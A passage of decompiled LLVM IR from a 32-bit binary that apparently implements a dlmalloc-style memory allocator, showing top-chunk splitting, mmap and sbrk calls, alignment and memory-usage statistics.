dec_label_pc_8050775:                             ; preds = %dec_label_pc_805072f, %dec_label_pc_805075e
  %v0_8050775 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050775 = add i32 %v0_8050775, 8
  store i32 %v1_8050775, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_805077d:                             ; preds = %dec_label_pc_80506ca, %dec_label_pc_8050485, %dec_label_pc_805048d
  %v0_805077d = load i32, i32* @global_var_805334c.33, align 4
  store i32 %v0_805077d, i32* @ebx, align 4
  %v1_8050787 = add i32 %.v1_8050473, 16
  store i32 %v1_8050787, i32* @esi, align 4
  %v1_805078a = add i32 %v0_805077d, 4
  %v2_805078a = inttoptr i32 %v1_805078a to i32*
  %v3_805078a = load i32, i32* %v2_805078a, align 4
  %v1_8050791 = and i32 %v3_805078a, -4
  store i32 %v1_8050791, i32* %ecx.global-to-local, align 4
  %v7_8050794 = icmp ult i32 %v1_8050791, %v1_8050787
  br i1 %v7_8050794, label %dec_label_pc_80507b4, label %dec_label_pc_8050798

dec_label_pc_8050798:                             ; preds = %dec_label_pc_805077d
  %v2_805079c = add i32 %v0_805077d, %.v1_8050473
  store i32 %v2_805079c, i32* @edx, align 4
  %v1_805079f = or i32 %.v1_8050473, 1
  store i32 %v1_805079f, i32* %eax.global-to-local, align 4
  store i32 %v2_805079c, i32* @global_var_805334c.33, align 4
  store i32 %v1_805079f, i32* %v2_805078a, align 4
  %v0_80507ab = load i32, i32* %ecx.global-to-local, align 4
  %v5_80507ab = sub i32 %v0_80507ab, %.v1_8050473
  store i32 %v5_80507ab, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8050b07

dec_label_pc_80507b4:                             ; preds = %dec_label_pc_805077d
  %v0_80507b4 = load i32, i32* @global_var_805367c.38, align 4
  store i32 %v0_80507b4, i32* %edx.global-to-local, align 4
  %v0_80507ba = load i8, i8* @global_var_8053320.32, align 32
  %v1_80507ba = and i8 %v0_80507ba, 2
  %v2_80507ba = icmp eq i8 %v1_80507ba, 0
  br i1 %v2_80507ba, label %dec_label_pc_80507e8, label %dec_label_pc_80507c3

dec_label_pc_80507c3:                             ; preds = %dec_label_pc_80507b4
  store i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32* %stack_var_-92, align 4
  %v2_80507cb = call i32 @function_805103b(i32* bitcast (i8* @global_var_8053320.32 to i32*))
  store i32 ptrtoint (i8* @global_var_8053320.32 to i32), i32* @ebx, align 4
  %v1_80507d5 = add i32 %.v1_8050473, -7
  store i32 %v1_80507d5, i32* %eax.global-to-local, align 4
  store i32 %v1_80507d5, i32* %stack_var_-92, align 4
  %v1_80507d9 = call i32 @function_805041e(i32 %v1_80507d5)
  store i32 %v1_80507d9, i32* %eax.global-to-local, align 4
  store i32 %v1_80507d9, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050b77

dec_label_pc_80507e8:                             ; preds = %dec_label_pc_80507b4
  %v1_80507e8 = add i32 %v0_80507b4, -1
  store i32 %v1_80507e8, i32* @ecx, align 4
  store i32 %.v1_8050473, i32* @ebx, align 4
  %v1_80507f3 = load i32, i32* @global_var_805366c.39, align 4
  %v7_80507f3 = icmp ult i32 %.v1_8050473, %v1_80507f3
  br i1 %v7_80507f3, label %dec_label_pc_80508b5, label %dec_label_pc_80507ff

dec_label_pc_80507ff:                             ; preds = %dec_label_pc_80507e8
  %v0_80507ff = load i32, i32* @global_var_8053670.40, align 16
  store i32 %v0_80507ff, i32* %eax.global-to-local, align 4
  %v1_8050804 = load i32, i32* @global_var_8053674.41, align 4
  %v5_805080a = icmp slt i32 %v0_80507ff, %v1_8050804
  br i1 %v5_805080a, label %dec_label_pc_8050810, label %dec_label_pc_80508b5

dec_label_pc_8050810:                             ; preds = %dec_label_pc_80507ff
  %v2_8050812 = add i32 %.v1_8050473, 10
  %v3_8050812 = add i32 %v2_8050812, %v0_80507b4
  %v1_8050816 = sub i32 0, %v0_80507b4
  store i32 %v1_8050816, i32* %eax.global-to-local, align 4
  %v2_8050818 = and i32 %v3_8050812, %v1_8050816
  store i32 %v2_8050818, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8050818, %.v1_8050473
  br i1 %tmp127, label %dec_label_pc_8050824, label %dec_label_pc_80508b5

dec_label_pc_8050824:                             ; preds = %dec_label_pc_8050810
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050831 = call i32 @function_8051c60(i32 0, i32 %v2_8050818, i32 3, i32 34, i32 0, i32 0, i32 %v1_80507e8, i32 %v1_80507e8)
  store i32 %v8_8050831, i32* %eax.global-to-local, align 4
  store i32 %v8_8050831, i32* @edx, align 4
  %v10_805083b = icmp eq i32 %v8_8050831, -1
  br i1 %v10_805083b, label %dec_label_pc_8050824.dec_label_pc_80508b5_crit_edge, label %dec_label_pc_8050840

dec_label_pc_8050824.dec_label_pc_80508b5_crit_edge: ; preds = %dec_label_pc_8050824
  %v0_80508b5.pre = load i32, i32* @global_var_805334c.33, align 4
  br label %dec_label_pc_80508b5

dec_label_pc_8050840:                             ; preds = %dec_label_pc_8050824
  %v1_8050842 = urem i32 %v8_8050831, 8
  %v2_8050842 = icmp eq i32 %v1_8050842, 0
  store i32 %v1_8050842, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050842, label %dec_label_pc_805085a, label %dec_label_pc_8050847

dec_label_pc_8050847:                             ; preds = %dec_label_pc_8050840
  %v0_805084c = load i32, i32* @ebx, align 4
  %v2_805084e = sub nsw i32 8, %v1_8050842
  store i32 %v2_805084e, i32* %eax.global-to-local, align 4
  %v2_8050850 = add i32 %v2_805084e, %v8_8050831
  store i32 %v2_8050850, i32* @edx, align 4
  %v2_8050852 = sub i32 %v0_805084c, %v2_805084e
  store i32 %v2_8050852, i32* %esi.global-to-local, align 4
  %v2_8050854 = inttoptr i32 %v2_8050850 to i32*
  store i32 %v2_805084e, i32* %v2_8050854, align 4
  br label %dec_label_pc_8050862

dec_label_pc_805085a:                             ; preds = %dec_label_pc_8050840
  %v1_805085a = inttoptr i32 %v8_8050831 to i32*
  store i32 0, i32* %v1_805085a, align 4
  br label %dec_label_pc_8050862

dec_label_pc_8050862:                             ; preds = %dec_label_pc_8050847, %dec_label_pc_805085a
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050847 ], [ @ebx, %dec_label_pc_805085a ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8050862 = or i32 %storemerge, 2
  %v1_8050865 = load i32, i32* @edx, align 4
  %v2_8050865 = add i32 %v1_8050865, 4
  %v3_8050865 = inttoptr i32 %v2_8050865 to i32*
  store i32 %v1_8050862, i32* %v3_8050865, align 4
  %v0_8050868 = load i32, i32* @global_var_8053670.40, align 16
  %v1_805086d = add i32 %v0_8050868, 1
  store i32 %v1_805086d, i32* %eax.global-to-local, align 4
  store i32 %v1_805086d, i32* @global_var_8053670.40, align 16
  %v1_8050873 = load i32, i32* @global_var_8053678.42, align 8
  %v7_8050879 = icmp sgt i32 %v1_805086d, %v1_8050873
  br i1 %v7_8050879, label %dec_label_pc_805087b, label %dec_label_pc_8050880

dec_label_pc_805087b:                             ; preds = %dec_label_pc_8050862
  store i32 %v1_805086d, i32* @global_var_8053678.42, align 8
  br label %dec_label_pc_8050880

dec_label_pc_8050880:                             ; preds = %dec_label_pc_8050862, %dec_label_pc_805087b
  %v0_8050880 = load i32, i32* @global_var_8053684.43, align 4
  %v1_8050885 = load i32, i32* @ebx, align 4
  %v2_8050885 = add i32 %v1_8050885, %v0_8050880
  store i32 %v2_8050885, i32* %eax.global-to-local, align 4
  store i32 %v2_8050885, i32* @global_var_8053684.43, align 4
  %v1_805088c = load i32, i32* @global_var_8053690.44, align 16
  %tmp128 = icmp ugt i32 %v2_8050885, %v1_805088c
  br i1 %tmp128, label %dec_label_pc_8050894, label %dec_label_pc_8050899

dec_label_pc_8050894:                             ; preds = %dec_label_pc_8050880
  store i32 %v2_8050885, i32* @global_var_8053690.44, align 16
  br label %dec_label_pc_8050899

dec_label_pc_8050899:                             ; preds = %dec_label_pc_8050880, %dec_label_pc_8050894
  %v1_8050899 = load i32, i32* @global_var_8053688.45, align 8
  %v2_8050899 = add i32 %v1_8050899, %v2_8050885
  store i32 %v2_8050899, i32* %eax.global-to-local, align 4
  %v1_805089f = load i32, i32* @global_var_8053694.46, align 4
  %tmp129 = icmp ugt i32 %v2_8050899, %v1_805089f
  br i1 %tmp129, label %dec_label_pc_80508ab, label %dec_label_pc_80504fc

dec_label_pc_80508ab:                             ; preds = %dec_label_pc_8050899
  store i32 %v2_8050899, i32* @global_var_8053694.46, align 4
  br label %dec_label_pc_80504fc

dec_label_pc_80508b5:                             ; preds = %dec_label_pc_8050810, %dec_label_pc_8050824.dec_label_pc_80508b5_crit_edge, %dec_label_pc_80507ff, %dec_label_pc_80507e8
  %v0_80508b5 = phi i32 [ %v0_80508b5.pre, %dec_label_pc_8050824.dec_label_pc_80508b5_crit_edge ], [ %v0_805077d, %dec_label_pc_80507ff ], [ %v0_805077d, %dec_label_pc_8050810 ], [ %v0_805077d, %dec_label_pc_80507e8 ]
  store i32 %v0_80508b5, i32* %eax.global-to-local, align 4
  %v1_80508be = add i32 %v0_80508b5, 4
  %v2_80508be = inttoptr i32 %v1_80508be to i32*
  %v3_80508be = load i32, i32* %v2_80508be, align 4
  %v1_80508c8 = and i32 %v3_80508be, -4
  %v2_80508c8 = icmp eq i32 %v1_80508c8, 0
  store i32 %v1_80508c8, i32* @ebp, align 4
  %v1_80508cb = load i32, i32* @global_var_8053668.47, align 8
  %v2_80508cb = add i32 %v1_80508cb, %v1_8050787
  store i32 %v2_80508cb, i32* %eax.global-to-local, align 4
  %v0_80508d1 = load i8, i8* @global_var_8053680.48, align 128
  %v1_80508d1 = urem i8 %v0_80508d1, 2
  %v2_80508d1 = icmp eq i8 %v1_80508d1, 0
  br i1 %v2_80508d1, label %dec_label_pc_80508dc, label %dec_label_pc_80508da

dec_label_pc_80508da:                             ; preds = %dec_label_pc_80508b5
  %v2_80508da = sub i32 %v2_80508cb, %v1_80508c8
  store i32 %v2_80508da, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80508dc

dec_label_pc_80508dc:                             ; preds = %dec_label_pc_80508b5, %dec_label_pc_80508da
  %v0_80508e0 = phi i32 [ %v2_80508cb, %dec_label_pc_80508b5 ], [ %v2_80508da, %dec_label_pc_80508da ]
  %v5_80508e0 = add i32 %v0_80508e0, %v1_80507e8
  store i32 %v5_80508e0, i32* %eax.global-to-local, align 4
  %v1_80508e4 = sub i32 0, %v0_80507b4
  store i32 %v1_80508e4, i32* @edx, align 4
  %v2_80508ec = and i32 %v5_80508e0, %v1_80508e4
  store i32 %v2_80508ec, i32* @esi, align 4
  %tmp91 = icmp slt i32 %v2_80508ec, 1
  br i1 %tmp91, label %dec_label_pc_8050906, label %dec_label_pc_80508f0

dec_label_pc_80508f0:                             ; preds = %dec_label_pc_80508dc
  store i32 %v2_80508ec, i32* %stack_var_-92, align 4
  %v1_80508f4 = call i32 @function_8052111(i32 %v2_80508ec)
  store i32 %v1_80508f4, i32* %eax.global-to-local, align 4
  store i32 -1, i32* @edx, align 4
  store i32 %v1_80508f4, i32* @ebx, align 4
  %v10_8050901 = icmp eq i32 %v1_80508f4, -1
  %v1_8050904 = icmp eq i1 %v10_8050901, false
  br i1 %v1_8050904, label %dec_label_pc_805095c.dec_label_pc_8050965_crit_edge, label %dec_label_pc_80508f0.dec_label_pc_8050906_crit_edge

dec_label_pc_80508f0.dec_label_pc_8050906_crit_edge: ; preds = %dec_label_pc_80508f0
  %v0_8050906.pre = load i8, i8* @global_var_8053680.48, align 128
  br label %dec_label_pc_8050906

dec_label_pc_8050906:                             ; preds = %dec_label_pc_80508f0.dec_label_pc_8050906_crit_edge, %dec_label_pc_80508dc
  %v0_8050932 = phi i32 [ -1, %dec_label_pc_80508f0.dec_label_pc_8050906_crit_edge ], [ %v1_80508e4, %dec_label_pc_80508dc ]
  %v0_8050906 = phi i8 [ %v0_8050906.pre, %dec_label_pc_80508f0.dec_label_pc_8050906_crit_edge ], [ %v0_80508d1, %dec_label_pc_80508dc ]
  %v1_8050906 = urem i8 %v0_8050906, 2
  %v2_8050906 = icmp eq i8 %v1_8050906, 0
  br i1 %v2_8050906, label %dec_label_pc_8050906.dec_label_pc_805091b_crit_edge, label %dec_label_pc_805090f

dec_label_pc_8050906.dec_label_pc_805091b_crit_edge: ; preds = %dec_label_pc_8050906
  %v0_805091b.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805091b

dec_label_pc_805090f:                             ; preds = %dec_label_pc_8050906
  %v2_8050913 = add i32 %v1_80508c8, %v1_80507e8
  store i32 %v2_8050913, i32* %eax.global-to-local, align 4
  %v0_8050915 = load i32, i32* @esi, align 4
  %v2_8050915 = add i32 %v0_8050915, %v2_8050913
  %v5_8050917 = and i32 %v2_8050915, %v1_80508e4
  store i32 %v5_8050917, i32* @esi, align 4
  br label %dec_label_pc_805091b

dec_label_pc_805091b:                             ; preds = %dec_label_pc_8050906.dec_label_pc_805091b_crit_edge, %dec_label_pc_805090f
  %v0_805091b = phi i32 [ %v0_805091b.pre, %dec_label_pc_8050906.dec_label_pc_805091b_crit_edge ], [ %v5_8050917, %dec_label_pc_805090f ]
  %tmp130 = icmp ult i32 %v0_805091b, 1048576
  br i1 %tmp130, label %dec_label_pc_8050923, label %dec_label_pc_8050928

dec_label_pc_8050923:                             ; preds = %dec_label_pc_805091b
  store i32 1048576, i32* @esi, align 4
  br label %dec_label_pc_8050928

dec_label_pc_8050928:                             ; preds = %dec_label_pc_805091b, %dec_label_pc_8050923
  %v0_805093c = phi i32 [ %v0_805091b, %dec_label_pc_805091b ], [ 1048576, %dec_label_pc_8050923 ]
  %tmp131 = icmp ugt i32 %v0_805093c, %.v1_8050473
  br i1 %tmp131, label %dec_label_pc_8050932, label %dec_label_pc_8050b6a

dec_label_pc_8050932:                             ; preds = %dec_label_pc_8050928
  store i32 0, i32* %stack_var_-92, align 4
  %v8_805093f = call i32 @function_8051c60(i32 0, i32 %v0_805093c, i32 3, i32 34, i32 0, i32 0, i32 %v0_8050932, i32 %v0_8050932)
  store i32 %v8_805093f, i32* %eax.global-to-local, align 4
  store i32 %v8_805093f, i32* @ebx, align 4
  %v10_8050949 = icmp eq i32 %v8_805093f, -1
  br i1 %v10_8050949, label %dec_label_pc_8050b6a, label %dec_label_pc_805095c.thread

dec_label_pc_805095c.thread:                      ; preds = %dec_label_pc_8050932
  %v0_8050952 = load i8, i8* @global_var_8053680.48, align 1
  %v2_8050952 = and i8 %v0_8050952, -2
  store i8 %v2_8050952, i8* @global_var_8053680.48, align 128
  %v1_8050959 = load i32, i32* @esi, align 4
  %v2_8050959 = add i32 %v1_8050959, %v8_805093f
  store i32 %v2_8050959, i32* @edx, align 4
  br label %dec_label_pc_8050965

dec_label_pc_805095c.dec_label_pc_8050965_crit_edge: ; preds = %dec_label_pc_80508f0
  %v1_8050969.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8050965

dec_label_pc_8050965:                             ; preds = %dec_label_pc_805095c.dec_label_pc_8050965_crit_edge, %dec_label_pc_805095c.thread
  %v1_8050969 = phi i32 [ %v1_8050959, %dec_label_pc_805095c.thread ], [ %v1_8050969.pre, %dec_label_pc_805095c.dec_label_pc_8050965_crit_edge ]
  %v0_8050a31100 = phi i32 [ %v8_805093f, %dec_label_pc_805095c.thread ], [ %v1_80508f4, %dec_label_pc_805095c.dec_label_pc_8050965_crit_edge ]
  %v0_8050a2399 = phi i32 [ %v2_8050959, %dec_label_pc_805095c.thread ], [ -1, %dec_label_pc_805095c.dec_label_pc_8050965_crit_edge ]
  %v0_8050969 = load i32, i32* @global_var_8053688.45, align 8
  %v2_8050969 = add i32 %v1_8050969, %v0_8050969
  store i32 %v2_8050969, i32* @global_var_8053688.45, align 8
  %v2_805096f = add i32 %v1_80508c8, %v0_80508b5
  store i32 %v2_805096f, i32* %ecx.global-to-local, align 4
  %v2_8050971 = sub i32 %v0_8050a31100, %v2_805096f
  %v12_8050971 = icmp eq i32 %v2_8050971, 0
  %v10_8050975 = icmp eq i32 %v0_8050a2399, -1
  %tmp132 = and i1 %v12_8050971, %v10_8050975
  br i1 %tmp132, label %dec_label_pc_805097a, label %dec_label_pc_805098c

dec_label_pc_805097a:                             ; preds = %dec_label_pc_8050965
  %v2_805097a = add i32 %v1_8050969, %v1_80508c8
  store i32 %v0_80508b5, i32* %ecx.global-to-local, align 4
  %v1_8050981 = or i32 %v2_805097a, 1
  store i32 %v1_8050981, i32* %eax.global-to-local, align 4
  store i32 %v1_8050981, i32* %v2_80508be, align 4
  br label %dec_label_pc_8050ab9

dec_label_pc_805098c:                             ; preds = %dec_label_pc_8050965
  %v7_8050971 = icmp ult i32 %v0_8050a31100, %v2_805096f
  %v0_805098c = load i8, i8* @global_var_8053680.48, align 1
  %v1_805098c = sext i8 %v0_805098c to i32
  store i32 %v1_805098c, i32* %eax.global-to-local, align 4
  %v2_8050991 = urem i8 %v0_805098c, 2
  %v3_8050991 = icmp eq i8 %v2_8050991, 0
  %brmerge = or i1 %v2_80508c8, %v3_8050991
  %v1_805099b = icmp eq i1 %v7_8050971, false
  %or.cond97 = or i1 %v1_805099b, %brmerge
  br i1 %or.cond97, label %dec_label_pc_80509a5, label %dec_label_pc_805099d

dec_label_pc_805099d:                             ; preds = %dec_label_pc_805098c
  %v1_805099d = and i32 %v1_805098c, -2
  %v4_805099d = trunc i32 %v1_805099d to i8
  store i32 %v1_805099d, i32* %eax.global-to-local, align 4
  store i8 %v4_805099d, i8* @global_var_8053680.48, align 128
  br label %dec_label_pc_80509a5

dec_label_pc_80509a5:                             ; preds = %dec_label_pc_805098c, %dec_label_pc_805099d
  %v0_80509a5 = phi i8 [ %v0_805098c, %dec_label_pc_805098c ], [ %v4_805099d, %dec_label_pc_805099d ]
  %v1_80509a5 = urem i8 %v0_80509a5, 2
  %v2_80509a5 = icmp eq i8 %v1_80509a5, 0
  br i1 %v2_80509a5, label %dec_label_pc_8050a23, label %dec_label_pc_80509ae

dec_label_pc_80509ae:                             ; preds = %dec_label_pc_80509a5
  br i1 %v2_80508c8, label %dec_label_pc_80509bc, label %dec_label_pc_80509b2

dec_label_pc_80509b2:                             ; preds = %dec_label_pc_80509ae
  store i32 %v2_8050971, i32* %eax.global-to-local, align 4
  %v2_80509b6 = add i32 %v2_8050969, %v2_8050971
  store i32 %v2_80509b6, i32* @global_var_8053688.45, align 8
  br label %dec_label_pc_80509bc

dec_label_pc_80509bc:                             ; preds = %dec_label_pc_80509ae, %dec_label_pc_80509b2
  %v1_80509be = urem i32 %v0_8050a31100, 8
  %v2_80509be = icmp eq i32 %v1_80509be, 0
  store i32 %v1_80509be, i32* %edx.global-to-local, align 4
  %v1_80509c1 = icmp eq i1 %v2_80509be, false
  br i1 %v1_80509c1, label %dec_label_pc_80509c9, label %dec_label_pc_80509c3

dec_label_pc_80509c3:                             ; preds = %dec_label_pc_80509bc
  store i32 %v0_8050a31100, i32* @edi, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80509d3

dec_label_pc_80509c9:                             ; preds = %dec_label_pc_80509bc
  %v2_80509ce = sub nsw i32 8, %v1_80509be
  store i32 %v2_80509ce, i32* %eax.global-to-local, align 4
  %v2_80509d0 = add i32 %v2_80509ce, %v0_8050a31100
  store i32 %v2_80509d0, i32* @edi, align 4
  br label %dec_label_pc_80509d3

dec_label_pc_80509d3:                             ; preds = %dec_label_pc_80509c3, %dec_label_pc_80509c9
  %v0_80509d6 = phi i32 [ 0, %dec_label_pc_80509c3 ], [ %v2_80509ce, %dec_label_pc_80509c9 ]
  %v2_80509d3 = add i32 %v1_8050969, %v0_8050a31100
  %v2_80509d6 = add i32 %v0_80509d6, %v1_80508c8
  store i32 %v2_80509d6, i32* %ecx.global-to-local, align 4
  %v2_80509df = add i32 %v2_80509d6, %v2_80509d3
  store i32 %v2_80509df, i32* %edx.global-to-local, align 4
  %v2_80509e5 = add i32 %v2_80509df, %v1_80507e8
  %v5_80509e8 = and i32 %v2_80509e5, %v1_80508e4
  %v2_80509ef = sub i32 %v5_80509e8, %v2_80509df
  store i32 %v2_80509ef, i32* %eax.global-to-local, align 4
  %v2_80509f1 = add i32 %v2_80509ef, %v2_80509d6
  store i32 %v2_80509f1, i32* @esi, align 4
  store i32 %v2_80509f1, i32* %stack_var_-92, align 4
  %v1_80509f5 = call i32 @function_8052111(i32 %v2_80509f1)
  store i32 %v1_80509f5, i32* %eax.global-to-local, align 4
  store i32 %v1_80509f5, i32* @edx, align 4
  %v10_80509ff = icmp eq i32 %v1_80509f5, -1
  %v1_8050a02 = icmp eq i1 %v10_80509ff, false
  br i1 %v1_8050a02, label %dec_label_pc_8050a12, label %dec_label_pc_8050a04

dec_label_pc_8050a04:                             ; preds = %dec_label_pc_80509d3
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050a09 = call i32 @function_8052111(i32 0)
  store i32 %v1_8050a09, i32* %eax.global-to-local, align 4
  store i32 %v1_8050a09, i32* @edx, align 4
  br label %dec_label_pc_8050a46

dec_label_pc_8050a12:                             ; preds = %dec_label_pc_80509d3
  %v1_8050a12 = load i32, i32* @ebx, align 4
  %v7_8050a12 = icmp ult i32 %v1_80509f5, %v1_8050a12
  %v1_8050a14 = icmp eq i1 %v7_8050a12, false
  br i1 %v1_8050a14, label %dec_label_pc_8050a4b, label %dec_label_pc_8050a16

dec_label_pc_8050a16:                             ; preds = %dec_label_pc_8050a12
  %v0_8050a16 = load i8, i8* @global_var_8053680.48, align 1
  %v2_8050a16 = and i8 %v0_8050a16, -2
  store i8 %v2_8050a16, i8* @global_var_8053680.48, align 128
  store i32 %v2_80509d3, i32* @edx, align 4
  br label %dec_label_pc_8050a2a

dec_label_pc_8050a23:                             ; preds = %dec_label_pc_80509a5
  store i32 %v0_8050a31100, i32* @edi, align 4
  br i1 %v10_8050975, label %dec_label_pc_8050a2e, label %dec_label_pc_8050a2a

dec_label_pc_8050a2a:                             ; preds = %dec_label_pc_8050a23, %dec_label_pc_8050a16
  %v0_8050a4b58 = phi i32 [ %v2_80509d3, %dec_label_pc_8050a16 ], [ %v0_8050a2399, %dec_label_pc_8050a23 ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050a4b

dec_label_pc_8050a2e:                             ; preds = %dec_label_pc_8050a23
  store i32 0, i32* %stack_var_-92, align 4
  %v1_8050a35 = call i32 @function_8052111(i32 0)
  store i32 %v1_8050a35, i32* @edx, align 4
  %v1_8050a3c = load i32, i32* @ebx, align 4
  %v2_8050a3c = sub i32 %v1_8050a35, %v1_8050a3c
  %v1_8050a3e = load i32, i32* @esi, align 4
  %v2_8050a3e = sub i32 %v2_8050a3c, %v1_8050a3e
  store i32 %v2_8050a3e, i32* %eax.global-to-local, align 4
  %v0_8050a40 = load i32, i32* @global_var_8053688.45, align 8
  %v2_8050a40 = add i32 %v0_8050a40, %v2_8050a3e
  store i32 %v2_8050a40, i32* @global_var_8053688.45, align 8
  br label %dec_label_pc_8050a46

dec_label_pc_8050a46:                             ; preds = %dec_label_pc_8050a04, %dec_label_pc_8050a2e
  %v0_8050a4b57 = phi i32 [ %v1_8050a09, %dec_label_pc_8050a04 ], [ %v1_8050a35, %dec_label_pc_8050a2e ]
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050a4b

dec_label_pc_8050a4b:                             ; preds = %dec_label_pc_8050a12, %dec_label_pc_8050a2a, %dec_label_pc_8050a46
  %v0_8050a50 = phi i32 [ %v1_80509f5, %dec_label_pc_8050a12 ], [ %v0_8050a4b58, %dec_label_pc_8050a2a ], [ %v0_8050a4b57, %dec_label_pc_8050a46 ]
  %v10_8050a4b = icmp eq i32 %v0_8050a50, -1
  br i1 %v10_8050a4b, label %dec_label_pc_8050ab9, label %dec_label_pc_8050a50

dec_label_pc_8050a50:                             ; preds = %dec_label_pc_8050a4b
  %v1_8050a50 = load i32, i32* @edi, align 4
  %v2_8050a50 = sub i32 %v0_8050a50, %v1_8050a50
  store i32 %v2_8050a50, i32* @edx, align 4
  store i32 %v1_8050a50, i32* @global_var_805334c.33, align 4
  %v1_8050a58 = load i32, i32* @esi, align 4
  %v2_8050a58 = add i32 %v1_8050a58, %v2_8050a50
  %v1_8050a5b = or i32 %v2_8050a58, 1
  store i32 %v1_8050a5b, i32* %eax.global-to-local, align 4
  %v2_8050a5e = add i32 %v1_8050a50, 4
  %v3_8050a5e = inttoptr i32 %v2_8050a5e to i32*
  store i32 %v1_8050a5b, i32* %v3_8050a5e, align 4
  %v0_8050a61 = load i32, i32* @global_var_8053688.45, align 8
  %v1_8050a61 = load i32, i32* @esi, align 4
  %v2_8050a61 = add i32 %v1_8050a61, %v0_8050a61
  store i32 %v2_8050a61, i32* @global_var_8053688.45, align 8
  br i1 %v2_80508c8, label %dec_label_pc_8050ab9, label %dec_label_pc_8050a6b

dec_label_pc_8050a6b:                             ; preds = %dec_label_pc_8050a50
  %v1_8050a6b = add i32 %v1_80508c8, -12
  store i32 %v0_80508b5, i32* %ecx.global-to-local, align 4
  %v1_8050a72 = and i32 %v1_8050a6b, -8
  store i32 %v1_8050a72, i32* %eax.global-to-local, align 4
  %v1_8050a77 = or i32 %v1_8050a72, 1
  store i32 %v1_8050a77, i32* @edx, align 4
  %v5_8050a7a = icmp ult i32 %v1_8050a72, 15
  store i32 %v1_8050a77, i32* %v2_80508be, align 4
  %v0_8050a80 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a80 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a80 = add i32 %v0_8050a80, 4
  %v3_8050a80 = add i32 %v2_8050a80, %v1_8050a80
  %v4_8050a80 = inttoptr i32 %v3_8050a80 to i32*
  store i32 5, i32* %v4_8050a80, align 4
  %v0_8050a88 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a88 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050a88 = add i32 %v0_8050a88, 8
  %v3_8050a88 = add i32 %v2_8050a88, %v1_8050a88
  %v4_8050a88 = inttoptr i32 %v3_8050a88 to i32*
  store i32 5, i32* %v4_8050a88, align 4
  br i1 %v5_8050a7a, label %dec_label_pc_8050ab9, label %dec_label_pc_8050a92

dec_label_pc_8050a92:                             ; preds = %dec_label_pc_8050a6b
  %v0_8050a95 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050a97 = add i32 %v0_8050a95, 8
  store i32 %v1_8050a97, i32* %eax.global-to-local, align 4
  %v0_8050a9a = load i32, i32* @global_var_8053664.49, align 4
  store i32 %v0_8050a9a, i32* @ebx, align 4
  store i32 %v1_8050a97, i32* %stack_var_-92, align 4
  store i32 -1, i32* @global_var_8053664.49, align 4
  %v1_8050aab = call i32 @function_80511e3(i32 %v1_8050a97)
  store i32 %v1_8050aab, i32* %eax.global-to-local, align 4
  %v0_8050ab0 = load i32, i32* @ebx, align 4
  store i32 %v0_8050ab0, i32* @global_var_8053664.49, align 4
  br label %dec_label_pc_8050ab9

dec_label_pc_8050ab9:                             ; preds = %dec_label_pc_8050a6b, %dec_label_pc_8050a50, %dec_label_pc_8050a4b, %dec_label_pc_805097a, %dec_label_pc_8050a92
  %v0_8050ab9 = load i32, i32* @global_var_8053688.45, align 8
  store i32 %v0_8050ab9, i32* %eax.global-to-local, align 4
  %v1_8050abe = load i32, i32* @global_var_805368c.50, align 4
  %tmp133 = icmp ugt i32 %v0_8050ab9, %v1_8050abe
  br i1 %tmp133, label %dec_label_pc_8050ac6, label %dec_label_pc_8050acb

dec_label_pc_8050ac6:                             ; preds = %dec_label_pc_8050ab9
  store i32 %v0_8050ab9, i32* @global_var_805368c.50, align 4
  br label %dec_label_pc_8050acb

dec_label_pc_8050acb:                             ; preds = %dec_label_pc_8050ab9, %dec_label_pc_8050ac6
  %v1_8050acb = load i32, i32* @global_var_8053684.43, align 4
  %v2_8050acb = add i32 %v1_8050acb, %v0_8050ab9
  store i32 %v2_8050acb, i32* %eax.global-to-local, align 4
  %v1_8050ad1 = load i32, i32* @global_var_8053694.46, align 4
  %tmp134 = icmp ugt i32 %v2_8050acb, %v1_8050ad1
  br i1 %tmp134, label %dec_label_pc_8050ad9, label %dec_label_pc_8050ade

dec_label_pc_8050ad9:                             ; preds = %dec_label_pc_8050acb
  store i32 %v2_8050acb, i32* @global_var_8053694.46, align 4
  br label %dec_label_pc_8050ade

dec_label_pc_8050ade:                             ; preds = %dec_label_pc_8050acb, %dec_label_pc_8050ad9
  %v0_8050ade = load i32, i32* @global_var_805334c.33, align 4
  store i32 %v0_8050ade, i32* @ebx, align 4
  %v1_8050ae4 = add i32 %v0_8050ade, 4
  %v2_8050ae4 = inttoptr i32 %v1_8050ae4 to i32*
  %v3_8050ae4 = load i32, i32* %v2_8050ae4, align 4
  %v1_8050ae7 = and i32 %v3_8050ae4, -4
  store i32 %v1_8050ae7, i32* %ecx.global-to-local, align 4
  %v10_8050aea = icmp ult i32 %v1_8050ae7, %v1_8050787
  br i1 %v10_8050aea, label %dec_label_pc_8050b6a, label %dec_label_pc_8050af0

dec_label_pc_8050af0:                             ; preds = %dec_label_pc_8050ade
  store i32 %.v1_8050473, i32* %esi.global-to-local, align 4
  %v2_8050af6 = sub i32 %v1_8050ae7, %.v1_8050473
  store i32 %v2_8050af6, i32* %ecx.global-to-local, align 4
  %v2_8050af8 = add i32 %v0_8050ade, %.v1_8050473
  store i32 %v2_8050af8, i32* @edx, align 4
  %v1_8050afb = or i32 %.v1_8050473, 1
  store i32 %v1_8050afb, i32* %eax.global-to-local, align 4
  store i32 %v2_8050af8, i32* @global_var_805334c.33, align 4
